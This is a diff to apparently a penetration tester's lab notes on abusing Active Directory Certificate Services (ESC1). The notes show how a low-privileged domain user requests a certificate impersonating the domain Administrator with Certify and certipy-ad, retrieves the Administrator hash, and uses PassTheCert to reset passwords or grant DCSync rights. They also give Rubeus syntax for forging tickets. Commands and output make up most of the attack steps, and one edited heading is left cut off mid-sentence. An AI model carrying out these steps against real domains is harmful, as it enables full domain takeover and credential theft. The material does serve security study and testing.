@@ -51,6 +51,7 @@ You can use certutil to:
 - backup and restore CA components,
 - verify certificates, key pairs, and certificate chains.
 
+(Note: the commands below are executed with a low-privileged domain user account logged on a domain joined machine.)
 
 C:\temp> certutil
 
@@ -172,8 +173,9 @@ The tool allows to:
 - Request a new certificate on behalf of another user, using an enrollment agent certificate
 - Download an already requested certificate
 
+(Note: the commands below are executed with a low-privileged domain user account logged on a domain joined machine.)
 
-Command to find information about all registered Certificate Authorities
+Command to find information about all registered Certificate Authorities (you need to use
 -------------------------------------------------------------------------
  
 C:\temp> Packed_Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
@@ -657,6 +659,8 @@ jeff@kali:~$ certipy-ad find -u LowPrivUser@company.work -p 'SuperGenialPwd' -ta
 STEP 2 - Find vulnerable certificate templates (ESC1) with the C# tool 'Certify.exe'
 =================================================================================================================
 
+(Note: the commands below are executed with a low-privileged domain user account logged on a domain joined machine.)
+
 Command to find vulnerable/abusable certificate templates using default low-privileged groups
 ----------------------------------------------------------------------------------------------
 
@@ -743,20 +747,18 @@ STEP 3 - Exploit the "ESC1" vulnerability to escalate your privileges from a Dom
 =================================================================================================================
 
 -----------------------------------------------------------------------------------------------------------------
-Method 1. Using the tool "Certipy.py" (which is named "certipy-ad" in Kali) and the tool "PassTheCert.exe"
+Method 1. Using the tool "Certipy.py" (which is named "certipy-ad" in Kali)
 -----------------------------------------------------------------------------------------------------------------
+
+=> First, install the tool "Certipy.py" (which is named "certipy-ad" in Kali) 
 
 jeff@kali:~$ sudo apt-get install certipy-ad
 Reading package lists... Done
 Building dependency tree... Done
-Reading state information... Done
 <SNIP>
 
-
 jeff@kali:~$ certipy-ad
-
 Certipy v4.3.0 - by Oliver Lyak (ly4k)
-
 usage: certipy-ad [-v] [-h] {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template} ...
 
 Active Directory Certificate Services enumeration and abuse
@@ -781,9 +783,8 @@ options:
   -h, --help            Show this help message and exit
 
 
-=> Command to request a new certificate as a low privileged domain user for the vulnerable template/CA (User_template) with 
-   the Domain Admin account "COMPANY\Administrator" specified as the alternate principal.
------------------------------------------------------------------------------------------------------------------------------
+=> Then, use it to request a certificate (as a low-privileged domain user) for the vulnerable template/CA (User_template) with the Domain Admin 
+   account "COMPANY\Administrator" specified as the alternate principal
 
 jeff@kali:~$ certipy-ad req -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167 -ca company-DC1-CA -template User_template -upn administrator@company.work -dc-ip 192.168.1.167
 
@@ -799,61 +800,57 @@ Certipy v4.3.0 - by Oliver Lyak (ly4k)
 jeff@kali:~$ ls -al administrator.pfx 
 -rw-r--r-- 1 jeff jeff 3125 May 30 03:29 administrator.pfx
 
+
+=> Finally, collect the password hash of the Domain Admin account "Company\Administrator" and then log into the DC as "Domain Admin" using "impacket-wmiexec"
+
 jeff@kali:~$ certipy-ad auth -pfx administrator.pfx -domain company.work -username administrator -dc-ip 192.168.1.167
 Certipy v4.3.0 - by Oliver Lyak (ly4k)
 
 [*] Using principal: administrator@company.work
-[*] Trying to get TGT...
-[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
-
-NOTES
-------
-The attack worked and we obtained a PFX certificate for the Domain Admin account "Company\Administrator".
-However when I tried to use the PFX certifcate I had a problem of time synchronization between my kali linux machine and my LAB Domain Controller 'dc1.company.work'.
-So I used the tool "PassTheCert.exe" to validate that the PFX certificate was valid :-)
-   
-PS C:\Users\j-cana\Documents\Tools-Pentest> .\Packed_PassTheCert.exe --cert-path ./administrator.pfx --whoami --target DC=company,DC=work --server 192.168.1.167
-Querying LDAP As : u:COMPANY\Administrator
 
 
 --------------------------------------------------------------------------------------------------------------------
-Method 2. Using the tool certify.exe
+Method 2. Using the tools "certify.exe" and "PassTheCert.exe"
 --------------------------------------------------------------------------------------------------------------------
 
-=> Command to request a new certificate for the vulnerable template/CA (User_template) with the Domain Admin account 
+(Note: the commands below need to be executed with a domain user account logged on a domain joined machine.)
+
+=> First use "certify.exe" to request a new certificate for the vulnerable template/CA (User_template) with the Domain Admin account 
   "COMPANY\Administrator" specified as the alternate principal.
---------------------------------------------------------------------------------------------------------------------
 
 C:\temp> Packed_Certify.exe request /ca:DC1.company.work\company-DC1-CA /template:User_template /altname:Administrator
 
-   _____          _   _  __
-  / ____|        | | (_)/ _|
- | |     ___ _ __| |_ _| |_ _   _
- | |    / _ \ '__| __| |  _| | | |
- | |___|  __/ |  | |_| | | | |_| |
-  \_____\___|_|   \__|_|_|  \__, |
-                             __/ |
-                            |___./
-  v1.1.0
 
-[*] Action: Request a Certificates
+=> Then, use "PassTheCert.exe" with the command "--whoami" to check that the PFX certificate is valid
 
-[*] Current user context    : COMPANY\LowPrivUser
-[*] No subject name specified, using current context as subject.
+PS C:\temp> .\Packed_PassTheCert.exe --cert-path ./administrator.pfx --whoami --target DC=company,DC=work --server 192.168.1.167
+Querying LDAP As : u:COMPANY\Administrator
 
-[*] Template                : User_template
-[*] Subject                 : CN=LowPrivUser, CN=Users, DC=company, DC=work
-[*] AltName                 : Administrator
 
-[*] Certificate Authority   : DC1.company.work\company-DC1-CA
-[X] Error sending the certificate request: System.Runtime.InteropServices.COMException (0x800706BA): CCertRequest::Submit: The RPC server is unavailable. 0x800706ba (WIN32: 1722 RPC_S_SERVER_UNAVAILABLE)
-   at CERTCLILib.ICertRequest3.Submit(Int32 Flags, String strRequest, String strAttributes, String strConfig)
-   at Certify.Cert.SendCertificateRequest(String CA, String message)
-   at Certify.Cert.RequestCert(String CA, Boolean machineContext, String templateName, String subject, String altName, String sidExtension, Boolean install)
+=> Finally, use "PassTheCert.exe" to reset the password of the account "COMPANY\Administrator" (command "--reset-password") 
+   or add DCsync privileges to any account (command "--elevate") to take over the Domain
 
-Certify completed in 00:00:00.5455515
+PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer|--reset-password) [ATTACK_OPTIONS]
+<SNIP>
+ATTACK TYPE:
+        --whoami
+                Query LDAP whoami to check if strict validation is being checked
+        --elevate
+                Elevate the rights of a user on the domain. Will grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.
+        --rbcd
+                Adds an SID to the msDS-AllowedToActOnBehalfOfOtherIdentity arttribute of the target.
+        --add-computer
+                Add a new computer to the domain (useful for RBCD attacks).
+        --reset-password
+                Reset the password of the targeted account (requires the User-Force-Change-Password right).
 
-Conclusion
------------
-=> It did not worked with the tool "Certify.exe" in my lab (I received an RPC error message) which is weird since the attack worked with the tool Certipy.
 
+--------------------------------------------------------------------------------------------------------------------
+Other Option - The tool "Rubeus.exe" can be used to request a kerberos TGT for the account "COMPANY\Administrator"
+--------------------------------------------------------------------------------------------------------------------
+
+=> Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy]
+
+=> Forge a diamond TGT by requesting a TGT using a PCKS12 certificate:
+        Rubeus.exe diamond /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
